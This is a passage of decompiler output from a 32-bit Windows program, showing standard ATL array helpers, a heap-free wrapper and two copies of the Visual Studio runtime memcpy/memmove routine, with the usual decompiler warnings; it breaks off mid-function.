operator__(CSimpleArray_struct_HINSTANCE____class_ATL__CSimpleArrayEqualHelper_struct_HINSTANCE______
           *this,int param_1)

{
  code *pcVar1;
  HINSTANCE__ **ppHVar2;
  
  if ((-1 < param_1) && (param_1 < *(int *)(this + 4))) {
    return (HINSTANCE__ **)(*(int *)this + param_1 * 4);
  }
  RaiseException(0xc000008c,1,0,(ULONG_PTR *)0x0);
  pcVar1 = (code *)swi(3);
  ppHVar2 = (HINSTANCE__ **)(*pcVar1)();
  return ppHVar2;
}



// Library Function - Single Match
//  public: struct HINSTANCE__ * __thiscall ATL::CAtlBaseModule::GetHInstanceAt(int)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

HINSTANCE__ * __thiscall ATL::CAtlBaseModule::GetHInstanceAt(CAtlBaseModule *this,int param_1)

{
  HINSTANCE__ **ppHVar1;
  HINSTANCE__ *pHVar2;
  
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 0x14));
  if ((*(int *)(this + 0x30) < param_1) || (param_1 < 0)) {
    pHVar2 = (HINSTANCE__ *)0x0;
  }
  else if (param_1 == *(int *)(this + 0x30)) {
    pHVar2 = *(HINSTANCE__ **)(this + 8);
  }
  else {
    ppHVar1 = CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>
              ::operator__((CSimpleArray_struct_HINSTANCE____class_ATL__CSimpleArrayEqualHelper_struct_HINSTANCE______
                            *)(this + 0x2c),param_1);
    pHVar2 = *ppHVar1;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(this + 0x14));
  return pHVar2;
}



// Library Function - Single Match
//  public: void __thiscall ATL::CSimpleArray<struct HINSTANCE__ *,class
// ATL::CSimpleArrayEqualHelper<struct HINSTANCE__ *>>::RemoveAll(void)
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __thiscall
ATL::CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>::
RemoveAll(CSimpleArray_struct_HINSTANCE____class_ATL__CSimpleArrayEqualHelper_struct_HINSTANCE______
          *this)

{
  if (*(int *)this != 0) {
    FID_conflict__free(*(void **)this);
    *(undefined4 *)this = 0;
  }
  *(undefined4 *)(this + 4) = 0;
  *(undefined4 *)(this + 8) = 0;
  return;
}



void __cdecl FID_conflict__free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_004369ec,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// WARNING: Control flow encountered bad instruction data
// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2012 Debug, Visual Studio 2012 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined8 uVar1;
  undefined auVar2 [32];
  undefined auVar3 [32];
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  int iVar16;
  undefined8 *puVar17;
  void *pvVar18;
  uint uVar19;
  uint uVar20;
  int iVar21;
  undefined8 *puVar22;
  undefined *puVar23;
  undefined4 *puVar24;
  undefined4 *puVar25;
  undefined4 uVar26;
  undefined4 uVar27;
  undefined4 uVar28;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar25 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar24 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar24 & 3) == 0) {
      uVar19 = _Size >> 2;
      if (uVar19 < 8) goto LAB_00416390;
      for (; uVar19 != 0; uVar19 = uVar19 - 1) {
        *puVar24 = *puVar25;
        puVar25 = puVar25 + -1;
        puVar24 = puVar24 + -1;
      }
      switch(_Size & 3) {
      case 1:
        goto switchD_004163b4_caseD_1;
      case 2:
        goto switchD_004163b4_caseD_2;
      case 3:
        goto switchD_004163b4_caseD_3;
      }
    }
    else {
      switch(_Size) {
      case 0:
        break;
      case 1:
switchD_004163b4_caseD_1:
        *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
        return _Dst;
      case 2:
switchD_004163b4_caseD_2:
        *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
        *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
        return _Dst;
      case 3:
switchD_004163b4_caseD_3:
        *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
        *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
        *(undefined *)((int)puVar24 + 1) = *(undefined *)((int)puVar25 + 1);
        return _Dst;
      default:
        uVar20 = _Size - ((uint)puVar24 & 3);
        switch((uint)puVar24 & 3) {
        case 1:
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          puVar25 = (undefined4 *)((int)puVar25 + -1);
          uVar19 = uVar20 >> 2;
          puVar24 = (undefined4 *)((int)puVar24 - 1);
          if (uVar19 < 8) {
LAB_00416390:
                    // WARNING: Could not recover jumptable at 0x00416392. Too many branches
                    // WARNING: Treating indirect jump as call
            pvVar18 = (void *)(*(code *)(&PTR_LAB_00416464)[-uVar19])();
            return pvVar18;
          }
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar24 = *puVar25;
            puVar25 = puVar25 + -1;
            puVar24 = puVar24 + -1;
          }
          switch(uVar20 & 3) {
          case 1:
            goto switchD_004163b4_caseD_1;
          case 2:
            goto switchD_004163b4_caseD_2;
          case 3:
            goto switchD_004163b4_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
          puVar25 = (undefined4 *)((int)puVar25 + -2);
          puVar24 = (undefined4 *)((int)puVar24 - 2);
          if (uVar19 < 8) goto LAB_00416390;
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar24 = *puVar25;
            puVar25 = puVar25 + -1;
            puVar24 = puVar24 + -1;
          }
          switch(uVar20 & 3) {
          case 1:
            goto switchD_004163b4_caseD_1;
          case 2:
            goto switchD_004163b4_caseD_2;
          case 3:
            goto switchD_004163b4_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)puVar24 + 1) = *(undefined *)((int)puVar25 + 1);
          puVar25 = (undefined4 *)((int)puVar25 + -3);
          puVar24 = (undefined4 *)((int)puVar24 - 3);
          if (uVar19 < 8) goto LAB_00416390;
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar24 = *puVar25;
            puVar25 = puVar25 + -1;
            puVar24 = puVar24 + -1;
          }
          switch(uVar20 & 3) {
          case 1:
            goto switchD_004163b4_caseD_1;
          case 2:
            goto switchD_004163b4_caseD_2;
          case 3:
            goto switchD_004163b4_caseD_3;
          }
        }
      }
    }
    return _Dst;
  }
  puVar23 = (undefined *)_Dst;
  if ((DAT_004369e8 >> 1 & 1) != 0) {
                    // WARNING: Load size is inaccurate
    for (; _Size != 0; _Size = _Size - 1) {
      *puVar23 = *_Src;
      _Src = (undefined *)((int)_Src + 1);
      puVar23 = puVar23 + 1;
    }
    return _Dst;
  }
  puVar25 = (undefined4 *)_Dst;
  if (_Size < 0x80) {
LAB_004161eb:
    if (((uint)_Dst & 3) != 0) {
LAB_00416208:
      switch(_Size) {
      case 0:
        return _Dst;
      case 1:
        break;
      case 2:
        goto switchD_00416220_caseD_2;
      case 3:
        goto switchD_00416220_caseD_3;
      default:
        uVar20 = (_Size - 4) + ((uint)_Dst & 3);
        switch((uint)_Dst & 3) {
        case 0:
                    // WARNING: Bad instruction - Truncating control flow here
          halt_baddata();
        case 1:
                    // WARNING: Load size is inaccurate
          *(undefined *)_Dst = *_Src;
          *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
          _Src = (undefined4 *)((int)_Src + 3);
          puVar25 = (undefined4 *)((int)_Dst + 3);
          if (7 < uVar19) {
                    // WARNING: Load size is inaccurate
            for (; uVar19 != 0; uVar19 = uVar19 - 1) {
              *puVar25 = *_Src;
              _Src = (undefined4 *)((int)_Src + 4);
              puVar25 = puVar25 + 1;
            }
            switch(uVar20 & 3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00416220_caseD_2;
            case 3:
              goto switchD_00416220_caseD_3;
            }
            break;
          }
          goto LAB_00416228;
        case 2:
                    // WARNING: Load size is inaccurate
          *(undefined *)_Dst = *_Src;
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
          _Src = (undefined4 *)((int)_Src + 2);
          puVar25 = (undefined4 *)((int)_Dst + 2);
          if (uVar19 < 8) goto LAB_00416228;
                    // WARNING: Load size is inaccurate
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar25 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          switch(uVar20 & 3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00416220_caseD_2;
          case 3:
            goto switchD_00416220_caseD_3;
          }
          break;
        case 3:
                    // WARNING: Load size is inaccurate
          *(undefined *)_Dst = *_Src;
          uVar19 = uVar20 >> 2;
          _Src = (undefined4 *)((int)_Src + 1);
          puVar25 = (undefined4 *)((int)_Dst + 1);
          if (uVar19 < 8) goto LAB_00416228;
                    // WARNING: Load size is inaccurate
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar25 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          switch(uVar20 & 3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00416220_caseD_2;
          case 3:
            goto switchD_00416220_caseD_3;
          }
        }
      }
      goto switchD_00416220_caseD_1;
    }
  }
  else {
    if (((((uint)_Dst ^ (uint)_Src) & 0xf) == 0) && ((DAT_00435000 >> 1 & 1) != 0)) {
      if (((uint)_Src & 0xf) != 0) {
        uVar19 = 0x10 - ((uint)_Src & 0xf);
        _Size = _Size - uVar19;
        for (uVar20 = uVar19 & 3; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
          *(undefined *)puVar25 = *_Src;
          _Src = (void *)((int)_Src + 1);
          puVar25 = (undefined4 *)((int)puVar25 + 1);
        }
        for (uVar19 = uVar19 >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {
                    // WARNING: Load size is inaccurate
          *puVar25 = *_Src;
          _Src = (void *)((int)_Src + 4);
          puVar25 = puVar25 + 1;
        }
      }
      for (uVar20 = _Size >> 7; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
        uVar26 = *(undefined4 *)((int)_Src + 4);
        uVar27 = *(undefined4 *)((int)_Src + 8);
        uVar28 = *(undefined4 *)((int)_Src + 0xc);
        uVar4 = *(undefined4 *)((int)_Src + 0x10);
        uVar5 = *(undefined4 *)((int)_Src + 0x14);
        uVar6 = *(undefined4 *)((int)_Src + 0x18);
        uVar7 = *(undefined4 *)((int)_Src + 0x1c);
        uVar8 = *(undefined4 *)((int)_Src + 0x20);
        uVar9 = *(undefined4 *)((int)_Src + 0x24);
        uVar10 = *(undefined4 *)((int)_Src + 0x28);
        uVar11 = *(undefined4 *)((int)_Src + 0x2c);
        uVar12 = *(undefined4 *)((int)_Src + 0x30);
        uVar13 = *(undefined4 *)((int)_Src + 0x34);
        uVar14 = *(undefined4 *)((int)_Src + 0x38);
        uVar15 = *(undefined4 *)((int)_Src + 0x3c);
        *puVar25 = *_Src;
        puVar25[1] = uVar26;
        puVar25[2] = uVar27;
        puVar25[3] = uVar28;
        puVar25[4] = uVar4;
        puVar25[5] = uVar5;
        puVar25[6] = uVar6;
        puVar25[7] = uVar7;
        puVar25[8] = uVar8;
        puVar25[9] = uVar9;
        puVar25[10] = uVar10;
        puVar25[0xb] = uVar11;
        puVar25[0xc] = uVar12;
        puVar25[0xd] = uVar13;
        puVar25[0xe] = uVar14;
        puVar25[0xf] = uVar15;
        uVar26 = *(undefined4 *)((int)_Src + 0x44);
        uVar27 = *(undefined4 *)((int)_Src + 0x48);
        uVar28 = *(undefined4 *)((int)_Src + 0x4c);
        uVar4 = *(undefined4 *)((int)_Src + 0x50);
        uVar5 = *(undefined4 *)((int)_Src + 0x54);
        uVar6 = *(undefined4 *)((int)_Src + 0x58);
        uVar7 = *(undefined4 *)((int)_Src + 0x5c);
        uVar8 = *(undefined4 *)((int)_Src + 0x60);
        uVar9 = *(undefined4 *)((int)_Src + 100);
        uVar10 = *(undefined4 *)((int)_Src + 0x68);
        uVar11 = *(undefined4 *)((int)_Src + 0x6c);
        uVar12 = *(undefined4 *)((int)_Src + 0x70);
        uVar13 = *(undefined4 *)((int)_Src + 0x74);
        uVar14 = *(undefined4 *)((int)_Src + 0x78);
        uVar15 = *(undefined4 *)((int)_Src + 0x7c);
        puVar25[0x10] = *(undefined4 *)((int)_Src + 0x40);
        puVar25[0x11] = uVar26;
        puVar25[0x12] = uVar27;
        puVar25[0x13] = uVar28;
        puVar25[0x14] = uVar4;
        puVar25[0x15] = uVar5;
        puVar25[0x16] = uVar6;
        puVar25[0x17] = uVar7;
        puVar25[0x18] = uVar8;
        puVar25[0x19] = uVar9;
        puVar25[0x1a] = uVar10;
        puVar25[0x1b] = uVar11;
        puVar25[0x1c] = uVar12;
        puVar25[0x1d] = uVar13;
        puVar25[0x1e] = uVar14;
        puVar25[0x1f] = uVar15;
        _Src = (void *)((int)_Src + 0x80);
        puVar25 = puVar25 + 0x20;
      }
      if ((_Size & 0x7f) != 0) {
        for (uVar20 = (_Size & 0x7f) >> 4; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
          uVar26 = *(undefined4 *)((int)_Src + 4);
          uVar27 = *(undefined4 *)((int)_Src + 8);
          uVar28 = *(undefined4 *)((int)_Src + 0xc);
          *puVar25 = *_Src;
          puVar25[1] = uVar26;
          puVar25[2] = uVar27;
          puVar25[3] = uVar28;
          _Src = (void *)((int)_Src + 0x10);
          puVar25 = puVar25 + 4;
        }
        if ((_Size & 0xf) != 0) {
          for (uVar20 = (_Size & 0xf) >> 2; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
            *puVar25 = *_Src;
            _Src = (void *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          for (uVar20 = _Size & 3; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
            *(undefined *)puVar25 = *_Src;
            _Src = (void *)((int)_Src + 1);
            puVar25 = (undefined4 *)((int)puVar25 + 1);
          }
        }
      }
      return _Dst;
    }
    if ((DAT_004369e8 & 1) == 0) goto LAB_004161eb;
    if (((uint)_Dst & 3) != 0) goto LAB_00416208;
    if (((uint)_Src & 3) == 0) {
      if (((uint)_Dst >> 2 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar26 = *_Src;
        _Size = _Size - 4;
        _Src = (void *)((int)_Src + 4);
        *(undefined4 *)_Dst = uVar26;
        _Dst = (void *)((int)_Dst + 4);
      }
      if (((uint)_Dst >> 3 & 1) != 0) {
                    // WARNING: Load size is inaccurate
        uVar1 = *_Src;
        _Size = _Size - 8;
        _Src = (void *)((int)_Src + 8);
        *(undefined8 *)_Dst = uVar1;
        _Dst = (void *)((int)_Dst + 8);
      }
      if (((uint)_Src & 7) == 0) {
                    // WARNING: Load size is inaccurate
        puVar17 = (undefined8 *)((int)_Src + -8);
        uVar26 = *_Src;
        uVar27 = *(undefined4 *)((int)_Src + 4);
        do {
          puVar22 = puVar17;
          uVar5 = *(undefined4 *)(puVar22 + 4);
          uVar6 = *(undefined4 *)((int)puVar22 + 0x24);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(puVar22 + 2);
          uVar28 = *(undefined4 *)(puVar22 + 7);
          uVar4 = *(undefined4 *)((int)puVar22 + 0x3c);
          auVar3 = *(undefined (*) [32])(puVar22 + 4);
          *(undefined4 *)((int)_Dst + 8) = uVar26;
          *(undefined4 *)((int)_Dst + 0xc) = uVar27;
          *(undefined4 *)((int)_Dst + 0x10) = uVar5;
          *(undefined4 *)((int)_Dst + 0x14) = uVar6;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x40,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x40,0);
          _Dst = (void *)((int)_Dst + 0x30);
          puVar17 = puVar22 + 6;
          uVar26 = uVar28;
          uVar27 = uVar4;
        } while (0x2f < (int)_Size);
        puVar22 = puVar22 + 7;
      }
      else if (((uint)_Src >> 3 & 1) == 0) {
                    // WARNING: Load size is inaccurate
        iVar16 = (int)_Src + -4;
        uVar26 = *_Src;
        uVar27 = *(undefined4 *)((int)_Src + 4);
        uVar28 = *(undefined4 *)((int)_Src + 8);
        do {
          iVar21 = iVar16;
          uVar7 = *(undefined4 *)(iVar21 + 0x20);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar21 + 0x10);
          uVar4 = *(undefined4 *)(iVar21 + 0x34);
          uVar5 = *(undefined4 *)(iVar21 + 0x38);
          uVar6 = *(undefined4 *)(iVar21 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar21 + 0x20);
          *(undefined4 *)((int)_Dst + 4) = uVar26;
          *(undefined4 *)((int)_Dst + 8) = uVar27;
          *(undefined4 *)((int)_Dst + 0xc) = uVar28;
          *(undefined4 *)((int)_Dst + 0x10) = uVar7;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x20,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x20,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar16 = iVar21 + 0x30;
          uVar26 = uVar4;
          uVar27 = uVar5;
          uVar28 = uVar6;
        } while (0x2f < (int)_Size);
        puVar22 = (undefined8 *)(iVar21 + 0x34);
      }
      else {
                    // WARNING: Load size is inaccurate
        iVar16 = (int)_Src + -0xc;
        uVar26 = *_Src;
        do {
          iVar21 = iVar16;
          uVar28 = *(undefined4 *)(iVar21 + 0x20);
          uVar4 = *(undefined4 *)(iVar21 + 0x24);
          uVar5 = *(undefined4 *)(iVar21 + 0x28);
          _Size = _Size - 0x30;
          auVar2 = *(undefined (*) [32])(iVar21 + 0x10);
          uVar27 = *(undefined4 *)(iVar21 + 0x3c);
          auVar3 = *(undefined (*) [32])(iVar21 + 0x20);
          *(undefined4 *)((int)_Dst + 0xc) = uVar26;
          *(undefined4 *)((int)_Dst + 0x10) = uVar28;
          *(undefined4 *)((int)_Dst + 0x14) = uVar4;
          *(undefined4 *)((int)_Dst + 0x18) = uVar5;
          *(undefined (*) [16])((int)_Dst + 0x10) = SUB3216(auVar2 >> 0x60,0);
          *(undefined (*) [16])((int)_Dst + 0x20) = SUB3216(auVar3 >> 0x60,0);
          _Dst = (void *)((int)_Dst + 0x30);
          iVar16 = iVar21 + 0x30;
          uVar26 = uVar27;
        } while (0x2f < (int)_Size);
        puVar22 = (undefined8 *)(iVar21 + 0x3c);
      }
      for (; 0xf < (int)_Size; _Size = _Size - 0x10) {
        uVar26 = *(undefined4 *)puVar22;
        uVar27 = *(undefined4 *)((int)puVar22 + 4);
        uVar28 = *(undefined4 *)(puVar22 + 1);
        uVar4 = *(undefined4 *)((int)puVar22 + 0xc);
        puVar22 = puVar22 + 2;
        *(undefined4 *)_Dst = uVar26;
        *(undefined4 *)((int)_Dst + 4) = uVar27;
        *(undefined4 *)((int)_Dst + 8) = uVar28;
        *(undefined4 *)((int)_Dst + 0xc) = uVar4;
        _Dst = (void *)((int)_Dst + 0x10);
      }
      if ((_Size >> 2 & 1) != 0) {
        uVar26 = *(undefined4 *)puVar22;
        _Size = _Size - 4;
        puVar22 = (undefined8 *)((int)puVar22 + 4);
        *(undefined4 *)_Dst = uVar26;
        _Dst = (void *)((int)_Dst + 4);
      }
      if ((_Size >> 3 & 1) != 0) {
        _Size = _Size - 8;
        *(undefined8 *)_Dst = *puVar22;
      }
                    // WARNING: Could not recover jumptable at 0x004161e9. Too many branches
                    // WARNING: Treating indirect jump as call
      pvVar18 = (void *)(*(code *)(&switchD_00416220::switchdataD_00416318)[_Size])();
      return pvVar18;
    }
  }
  uVar19 = _Size >> 2;
  if (uVar19 < 8) {
LAB_00416228:
                    // WARNING: Could not recover jumptable at 0x00416228. Too many branches
                    // WARNING: Treating indirect jump as call
    pvVar18 = (void *)(*(code *)(&PTR_LAB_004162ac)[uVar19])();
    return pvVar18;
  }
                    // WARNING: Load size is inaccurate
  for (; uVar19 != 0; uVar19 = uVar19 - 1) {
    *puVar25 = *_Src;
    _Src = (undefined4 *)((int)_Src + 4);
    puVar25 = puVar25 + 1;
  }
  switch(_Size & 3) {
  case 0:
    return _Dst;
  case 2:
switchD_00416220_caseD_2:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar25 = *_Src;
    *(undefined *)((int)puVar25 + 1) = *(undefined *)((int)_Src + 1);
    return _Dst;
  case 3:
switchD_00416220_caseD_3:
                    // WARNING: Load size is inaccurate
    *(undefined *)puVar25 = *_Src;
    *(undefined *)((int)puVar25 + 1) = *(undefined *)((int)_Src + 1);
    *(undefined *)((int)puVar25 + 2) = *(undefined *)((int)_Src + 2);
    return _Dst;
  }
switchD_00416220_caseD_1:
                    // WARNING: Load size is inaccurate
  *(undefined *)puVar25 = *_Src;
  return _Dst;
}



// WARNING: Control flow encountered bad instruction data
// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2012 Debug, Visual Studio 2012 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined8 uVar1;
  undefined auVar2 [32];
  undefined auVar3 [32];
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  int iVar16;
  undefined8 *puVar17;
  void *pvVar18;
  uint uVar19;
  uint uVar20;
  int iVar21;
  undefined8 *puVar22;
  undefined *puVar23;
  undefined4 *puVar24;
  undefined4 *puVar25;
  undefined4 uVar26;
  undefined4 uVar27;
  undefined4 uVar28;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar25 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar24 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar24 & 3) == 0) {
      uVar19 = _Size >> 2;
      if (uVar19 < 8) goto LAB_004169e0;
      for (; uVar19 != 0; uVar19 = uVar19 - 1) {
        *puVar24 = *puVar25;
        puVar25 = puVar25 + -1;
        puVar24 = puVar24 + -1;
      }
      switch(_Size & 3) {
      case 1:
        goto switchD_00416a04_caseD_1;
      case 2:
        goto switchD_00416a04_caseD_2;
      case 3:
        goto switchD_00416a04_caseD_3;
      }
    }
    else {
      switch(_Size) {
      case 0:
        break;
      case 1:
switchD_00416a04_caseD_1:
        *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
        return _Dst;
      case 2:
switchD_00416a04_caseD_2:
        *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
        *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
        return _Dst;
      case 3:
switchD_00416a04_caseD_3:
        *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
        *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
        *(undefined *)((int)puVar24 + 1) = *(undefined *)((int)puVar25 + 1);
        return _Dst;
      default:
        uVar20 = _Size - ((uint)puVar24 & 3);
        switch((uint)puVar24 & 3) {
        case 1:
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          puVar25 = (undefined4 *)((int)puVar25 + -1);
          uVar19 = uVar20 >> 2;
          puVar24 = (undefined4 *)((int)puVar24 - 1);
          if (uVar19 < 8) {
LAB_004169e0:
                    // WARNING: Could not recover jumptable at 0x004169e2. Too many branches
                    // WARNING: Treating indirect jump as call
            pvVar18 = (void *)(*(code *)(&PTR_LAB_00416ab4)[-uVar19])();
            return pvVar18;
          }
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar24 = *puVar25;
            puVar25 = puVar25 + -1;
            puVar24 = puVar24 + -1;
          }
          switch(uVar20 & 3) {
          case 1:
            goto switchD_00416a04_caseD_1;
          case 2:
            goto switchD_00416a04_caseD_2;
          case 3:
            goto switchD_00416a04_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
          puVar25 = (undefined4 *)((int)puVar25 + -2);
          puVar24 = (undefined4 *)((int)puVar24 - 2);
          if (uVar19 < 8) goto LAB_004169e0;
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar24 = *puVar25;
            puVar25 = puVar25 + -1;
            puVar24 = puVar24 + -1;
          }
          switch(uVar20 & 3) {
          case 1:
            goto switchD_00416a04_caseD_1;
          case 2:
            goto switchD_00416a04_caseD_2;
          case 3:
            goto switchD_00416a04_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)puVar24 + 1) = *(undefined *)((int)puVar25 + 1);
          puVar25 = (undefined4 *)((int)puVar25 + -3);
          puVar24 = (undefined4 *)((int)puVar24 - 3);
          if (uVar19 < 8) goto LAB_004169e0;
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar24 = *puVar25;
            puVar25 = puVar25 + -1;
            puVar24 = puVar24 + -1;
          }
          switch(uVar20 & 3) {
          case 1:
            goto switchD_00416a04_caseD_1;
          case 2:
            goto switchD_00416a04_caseD_2;
          case 3:
            goto switchD_00416a04_caseD_3;
          }
        }
      }
    }
    return _Dst;
  }
  puVar23 = (undefined *)_Dst;
  if ((DAT_004369e8 >> 1 & 1) != 0) {
                    // WARNING: Load size is inaccurate
    for (; _Size != 0; _Size = _Size - 1) {
      *puVar23 = *_Src;
      _Src = (undefined *)((int)_Src + 1);
      puVar23 = puVar23 + 1;
    }
    return _Dst;
  }
  puVar25 = (undefined4 *)_Dst;
  if (_Size < 0x80) {
LAB_0041683b:
    if (((uint)_Dst & 3) != 0) {
LAB_00416858:
      switch(_Size) {
      case 0:
        return _Dst;
      case 1:
        break;
      case 2:
        goto switchD_00416870_caseD_2;
      case 3:
        goto switchD_00416870_caseD_3;
      default:
        uVar20 = (_Size - 4) + ((uint)_Dst & 3);
        switch((uint)_Dst & 3) {
        case 0:
                    // WARNING: Bad instruction - Truncating control flow here
          halt_baddata();
        case 1:
                    // WARNING: Load size is inaccurate
          *(undefined *)_Dst = *_Src;
          *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
          _Src = (undefined4 *)((int)_Src + 3);
          puVar25 = (undefined4 *)((int)_Dst + 3);
          if (7 < uVar19) {
                    // WARNING: Load size is inaccurate
            for (; uVar19 != 0; uVar19 = uVar19 - 1) {
              *puVar25 = *_Src;
              _Src = (undefined4 *)((int)_Src + 4);
              puVar25 = puVar25 + 1;
            }
            switch(uVar20 & 3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_00416870_caseD_2;
            case 3:
              goto switchD_00416870_caseD_3;
            }
            break;
          }
          goto LAB_00416878;
        case 2:
                    // WARNING: Load size is inaccurate
          *(undefined *)_Dst = *_Src;
          uVar19 = uVar20 >> 2;
          *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
          _Src = (undefined4 *)((int)_Src + 2);
          puVar25 = (undefined4 *)((int)_Dst + 2);
          if (uVar19 < 8) goto LAB_00416878;
                    // WARNING: Load size is inaccurate
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar25 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          switch(uVar20 & 3) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_00416870_caseD_2;
          case 3:
            goto switchD_00416870_caseD_3;
          }
          break;
        case 3:
                    // WARNING: Load size is inaccurate
          *(undefined *)_Dst = *_Src;
          uVar19 = uVar20 >> 2;
          _Src = (undefined4 *)((int)_Src + 1);
          puVar25 = (undefined4 *)((int)_Dst + 1);
          if (uVar19 < 8) goto LAB_00416878;
